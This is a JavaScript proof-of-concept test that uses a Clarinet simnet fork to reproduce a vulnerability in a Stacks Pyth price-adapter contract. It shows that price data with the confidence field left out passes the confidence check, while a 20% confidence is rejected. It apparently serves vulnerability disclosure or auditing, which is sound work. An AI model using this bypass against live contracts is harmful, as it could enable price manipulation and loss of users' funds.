import { initSimnet } from "@stacks/clarinet-sdk";
import { Cl } from "@stacks/transactions";
import assert from "node:assert/strict";

const simnet = await initSimnet("./tests/remote/97281/Clarinet.toml", false, {
  trackCosts: false,
  trackCoverage: false,
});

const ADAPTER = "SPSX722NK9V3A8D3CVQT0CDY4EBQ3E9FSDDE61FT.pyth-adapter-v1";
const SBTC = Cl.contractPrincipal(
  "SM3VDXK3WZZSA84XXFKAFAF15NNZX32CTSG82JFQ4",
  "sbtc-token"
);
const sender = "ST1PQHQKV0RJXZFY1DGX8MNSNYVE3VGZJSRTPGZGM";

// Fork block 8666449; previous block time 1785409932 + STACKS_BLOCK_TIME 5 = 1785409937.
// Valid freshness window: (1785409637, 1785409997].
const TIMESTAMP = 1785409948;
const PRICE = 10000000000000n; // raw Lazer price with exponent -8
const BOUND = 500000000000n; // price * ratio 500 / 10000

const makeVerified = (confidence) =>
  Cl.tuple({
    timestamp: Cl.uint(TIMESTAMP),
    feeds: Cl.list([
      Cl.tuple({
        "feed-id": Cl.uint(1),
        price: Cl.int(PRICE),
        exponent: Cl.int(-8n),
        confidence,
      }),
    ]),
  });

const call = (confidence) =>
  simnet.callPublicFn(
    ADAPTER,
    "prices-for",
    [makeVerified(confidence), Cl.list([SBTC])],
    sender
  ).result;

const absent = call(Cl.none());
const present20 = call(Cl.some(Cl.uint(2000000000000n)));
const present5 = call(Cl.some(Cl.uint(BOUND)));

console.log("absent:", JSON.stringify(absent));
console.log("present20:", JSON.stringify(present20));
console.log("present5:", JSON.stringify(present5));

assert.equal(
  absent.type,
  "ok",
  "absent confidence must be accepted to reproduce 97281"
);
assert.equal(
  absent.value.value[0].value.toString(),
  PRICE.toString(),
  "absent confidence should return the raw price"
);
assert.equal(
  present20.type,
  "err",
  "present 20% confidence must be rejected"
);
assert.equal(
  present20.value.value.toString(),
  "80004",
  "present 20% must return ERR-PRICE-CONFIDENCE-LOW"
);
assert.equal(
  present5.type,
  "ok",
  "present 5% confidence at the bound must be accepted"
);
assert.equal(
  present5.value.value[0].value.toString(),
  PRICE.toString(),
  "present 5% should return the raw price"
);

console.log(
  "VULNERABILITY REPRODUCED: absent confidence bypasses check-confidence; present 20% is rejected."
);
